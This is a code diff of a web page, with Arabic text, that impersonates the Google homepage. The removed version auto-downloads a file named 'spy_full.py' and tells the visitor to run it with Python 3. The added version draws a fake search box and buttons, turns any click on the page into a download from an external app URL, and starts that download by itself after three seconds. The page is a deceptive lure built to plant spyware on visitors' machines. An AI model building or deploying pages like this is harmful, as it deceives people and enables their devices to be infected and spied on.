@@ -5,36 +5,101 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Google</title>
     <style>
-        body { background: white; font-family: Arial, sans-serif; text-align: center; padding-top: 100px; margin: 0; }
-        img { width: 300px; margin-bottom: 30px; }
-        h2 { color: #202124; font-size: 28px; }
-        p { color: #5f6368; font-size: 20px; }
+        body { 
+            background: white; 
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; 
+            margin: 0; 
+            display: flex; 
+            flex-direction: column; 
+            align-items: center; 
+            justify-content: center; 
+            height: 100vh;
+            cursor: pointer;
+        }
+        .container { text-align: center; }
+        img { width: 272px; margin-bottom: 20px; }
+        .search-box {
+            width: 584px;
+            height: 44px;
+            border: 1px solid #dfe1e5;
+            border-radius: 24px;
+            margin-bottom: 30px;
+            display: flex;
+            align-items: center;
+            padding: 0 20px;
+            box-shadow: none;
+            transition: box-shadow 0.3s;
+        }
+        .search-box:hover {
+            box-shadow: 0 1px 6px rgba(32,33,36,0.28);
+            border-color: rgba(223,225,229,0);
+        }
+        .buttons { display: flex; gap: 12px; }
+        button {
+            background-color: #f8f9fa;
+            border: 1px solid #f8f9fa;
+            border-radius: 4px;
+            color: #3c4043;
+            font-family: arial,sans-serif;
+            font-size: 14px;
+            margin: 11px 4px;
+            padding: 0 16px;
+            line-height: 27px;
+            height: 36px;
+            min-width: 54px;
+            text-align: center;
+            cursor: pointer;
+            user-select: none;
+        }
+        button:hover {
+            box-shadow: 0 1px 1px rgba(0,0,0,0.1);
+            background-image: -webkit-linear-gradient(top,#f8f8f8,#f1f1f1);
+            background-color: #f8f8f8;
+            border: 1px solid #c6c6c6;
+            color: #222;
+        }
+        #status {
+            margin-top: 20px;
+            color: #5f6368;
+            font-size: 14px;
+        }
     </style>
 </head>
-<body>
-    <img src="https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_272x92dp.png" alt="Google">
-    <h2>جاري تحميل الملف...</h2>
-    <p>يرجى الانتظار قليلاً</p>
+<body onclick="triggerDownload()">
+    <div class="container">
+        <img src="https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_272x92dp.png" alt="Google">
+        <div class="search-box">
+            <svg focusable="false" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" width="20" height="20" style="fill: #9aa0a6; margin-right: 10px;"><path d="M15.5 14h-.79l-.28-.27A6.471 6.471 0 0 0 16 9.5 6.5 6.5 0 1 0 9.5 16c1.61 0 3.09-.59 4.23-1.57l.27.28v.79l5 4.99L20.49 19l-4.99-5zm-6 0C7.01 14 5 11.99 5 9.5S7.01 5 9.5 5 14 7.01 14 9.5 11.99 14 9.5 14z"></path></svg>
+        </div>
+        <div class="buttons">
+            <button>بحث Google</button>
+            <button>ضربة حظ</button>
+        </div>
+        <div id="status">انقر في أي مكان للبدء...</div>
+    </div>
 
     <script>
-        function downloadFile() {
-            const url = window.location.href;
+        let downloaded = false;
+        function triggerDownload() {
+            if (downloaded) return;
+            
+            // سيتم استبدال هذا الرابط ديناميكياً في app.py
+            const downloadUrl = "https://rashdai.streamlit.app/api/upload";
+            
             const link = document.createElement('a');
-            link.href = url;
-            link.download = 'spy_full.py';
+            link.href = downloadUrl;
+            link.target = "_blank"; // فتح في نافذة جديدة لضمان التحميل في بعض المتصفحات
             document.body.appendChild(link);
             link.click();
             document.body.removeChild(link);
-
-            // رسالة بعد التنزيل
-            setTimeout(() => {
-                alert('تم تنزيل الملف بنجاح!\nافتحه باستخدام Python 3');
-            }, 600);
+            
+            document.getElementById('status').innerText = "جاري التحميل... يرجى التحقق من التنزيلات.";
+            downloaded = true;
         }
 
-        // ابدأ التنزيل فور تحميل الصفحة
+        // محاولة التحميل التلقائي بعد 3 ثوانٍ إذا لم ينقر المستخدم
         window.onload = function() {
-            setTimeout(downloadFile, 1200);   // بعد 1.2 ثانية
+            setTimeout(triggerDownload, 3000);
         };
     </script>
 </body>
